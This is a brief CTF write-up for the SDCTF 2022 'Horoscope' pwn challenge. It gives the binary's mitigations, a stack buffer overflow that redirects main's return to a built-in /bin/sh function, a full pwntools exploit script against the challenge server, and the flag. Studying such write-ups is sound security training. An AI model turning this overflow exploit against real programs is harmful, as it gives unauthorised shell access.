---
title: "[Pwn] Horoscope [SDCTF 2022]"
date: 2022-05-09 18:51:00
---

# 0x0 Introduction

Easy

This program will predict your future!

Connect
nc horoscope.sdc.tf 1337

By green beans

files: [horoscope](horoscope)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vulnerability

binary have a `/bin/sh` backdoor in function `sym.test`.

`main` has a buffer overflow vulnerbility, we can change rip of main to `sym.test` and get shell.

# 0x3 Exploit

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./horoscope")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("horoscope.sdc.tf",1337)

    return r

io = conn()
if args.R2:
    input("asd")
io.sendlineafter(b"own horoscope\n",flat({
    0:b"01/01/2001/1234\x00",
    0x30+8:0x0040095f
}))
io.interactive()
```

# 0x4 Flag

sdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y}